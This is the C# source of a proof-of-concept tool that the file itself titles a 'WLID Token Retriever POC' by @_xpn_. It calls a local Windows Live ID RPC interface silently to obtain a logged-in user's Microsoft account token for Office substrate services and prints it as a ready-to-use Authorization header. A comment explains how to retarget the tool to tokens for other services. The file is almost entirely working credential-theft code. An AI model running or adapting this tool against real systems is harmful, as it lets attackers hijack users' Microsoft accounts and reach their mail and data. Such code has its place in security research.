using NtApiDotNet.Ndr.Marshal;
//using rpc_cc105610_da03_467e_bc73_5b9e2937458d_1_0_Win101809;
using rpc_cc105610_da03_467e_bc73_5b9e2937458d_1_0_Win1122H2;
using System;

namespace LaunchUACAdmin
{
    class Program
    {
        static void GetToken(string email, string clientID)
        {
            using (Client client = new Client())
            {
                Struct_5[] s5 = new Struct_5[1];
                int arg1, arg2, arg3, arg4, arg6;

                Struct_4[] s4 = new Struct_4[] {
                    new Struct_4(
                        // Change to gen tokens for other services
                        "scope=service::substrate.office.com::MBI_SSL_SHORT&telemetry=MATS&uaid=ABCDEF12-3456-7890-AAAA-DEADB33F0000&clientid=00000000480728C5",
                        "TOKEN_BROKER",
                        "",
                        0,
                        0,
                        0, // Remove this if targeting Win10
                        1
                        ) };

                client.Connect();
                NdrContextHandle context;

                client.WLIDCreateContext(email, clientID, 0x880000, out context);
                client.WLIDAcquireTokensWithNGC(context, 0x200, 1, s4, "", 0, "Silent", out arg1, out arg2, out arg3, out arg4, out s5, out arg6);

                Console.WriteLine("[*] Retrieved Token:");
                Console.WriteLine("X-AnchorMailbox: CID:{0}", s5[0].Member18);
                Console.WriteLine("Authorization: Passport1.4 from-PP='{0}'", s5[0].Member28);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("email address argument required");
                return;
            }

            Console.WriteLine("WLID Token Retriever POC by @_xpn_\n");
            GetToken(args[0], "00000000480728C5");
        }
    }
}
